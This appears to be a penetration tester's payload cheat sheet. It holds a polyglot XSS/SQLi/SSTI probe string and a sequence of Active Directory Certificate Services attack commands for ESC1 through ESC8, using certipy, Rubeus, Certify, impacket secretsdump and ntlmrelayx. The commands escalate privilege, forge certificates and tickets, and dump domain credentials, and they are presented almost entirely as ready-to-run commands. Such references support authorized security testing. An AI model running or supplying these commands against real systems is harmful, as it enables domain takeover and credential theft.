# Payload Collection

# XSS, SQLi, SSTI, etc.

``` 
'"`><img src=x>${{7*7}}
💋img src=x onerror=alert(document.domain)//💛
```

# Active Directory

## AD CS
```
certipy find -u 'user@domain' -p 'Password' -dc-ip '10.0.0.55'
certipy find -u 'user@domain' -p 'Password' -dc-ip '10.0.0.55' /vulnerable
certipy find 'domain/user:Password@dc.domain.local' -old-bloodhound

# ESC1
.\Rubeus.exe asktgt /domain:domain /dc:dc.domain /user:Administrator /certificate:esc1.pfx /ptt
.\PsExec.exe -accepteula \\ cmd
## proceed on linux
.\Rubeus.exe asktgt /domain:domain /dc:dc.domain /user:Administrator /certificate:esc1.pfx /nowrap /outfile:ticket.kirbi
python3 /opt/impacket/examples/ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
python3 /opt/impacket/examples/secretsdump.py domain/domainadmin@dc.domain.local -k -no-pass -outfile dcsync.txt

# ESC2, same as ESC1 for exploitation

# ESC3
certipy req 'domain/user:Password@ca.domain' -ca 'CA-server' -template 'ESC3' #get pfx file
certipy req 'domain/user:Password@ca.domain' -ca 'CA-server' -template 'User' -on-behalf-of 'domain\administrator' -pfx 'user.pfx'

# ESC4
certipy template -u 'domain/user:Password@ca.domain' -p 'Password' -target 'dc.domain' -template 'ESC4'

# ESC5, with admin user on CA
certipy ca -backup -u 'localadmin' -p 'test' -target 'dc.domain' -ca 'ca-server'
certipy forge -ca-pfx localadmin.pfx -upn chef@domain -subject 'CN=chef,CN=Users,DC=mcafeelab,DC=local'
certipy auth -pfx 'chef_forged.pfx' -dc-ip '10.55.0.2'

# ESC6
certipy req -u 'localadmin' -p 'test' -target 'dc.domain' -ca 'ca-server' -template 'user' -upn 'domainadmin@domain'
certipy auth -pfx 'domainadmin.pfx' -dc-ip '10.55.0.2' -username 'domainadmin' -domain 'mcafeelab.local'

# ESC7
Certify.exe find /vulnerable
Certify.exe setconfig /enablesan /restart # ESC6, change SAN setting
Certify.exe request /template:User /altname:super.adm
Certify.exe setconfig /removeapproval /restart

# ESC8
python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate

``` 
